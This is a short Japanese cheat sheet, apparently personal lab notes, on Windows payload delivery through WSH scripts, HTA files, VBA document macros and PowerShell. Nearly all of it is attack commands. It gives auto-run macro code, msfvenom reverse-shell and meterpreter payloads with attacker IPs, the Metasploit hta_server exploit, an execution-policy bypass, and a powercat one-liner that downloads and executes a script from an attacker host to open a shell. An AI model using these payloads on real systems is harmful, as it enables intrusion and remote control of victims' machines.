# script

## WSH (Windows Scripting Host)

概念

```shell
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

txt 拡張子でスクリプト実行

```shell
wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

## HTA (HTML Application)

概念

```html
<html>
  <body>
    <script>
      var c = "cmd.exe";
      new ActiveXObject("WScript.Shell").Run(c);
    </script>
  </body>
</html>
```

venom リバースシェル

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.22.182 LPORT=443 -f hta-psh -o thm.hta
```

metasploit

```shell
use exploit/windows/misc/hta_server
```

## VBA (Visual Basic for Application)

概念

```vbscript
Sub Document_Open()
  CLC
End Sub

Sub AutoOpen()
  CLC
End Sub

Sub CLC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

msfvenom

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba -o vba.txt
```

この出力をマクロエディタに張り付ける。  
※MS Word に適応させるためには、Workbook_Open()を Document_Open()に変更する必要がある。

## PSH (Powershell)

実行ポリシーの変更

```ps
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```

ポリシーのバイパス

```shell
powershell -ex bypass -File poc.ps1
```

### Powercat

kali 側

```shell
git clone https://github.com/besimorhino/powercat.git
cd powercat
python3 -m http.server 8888

nc -lvp 1337
```

被害者側

```shell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attackerip>:8888/powercat.ps1');powercat -c <attackerip> -p 1337 -e cmd"
```
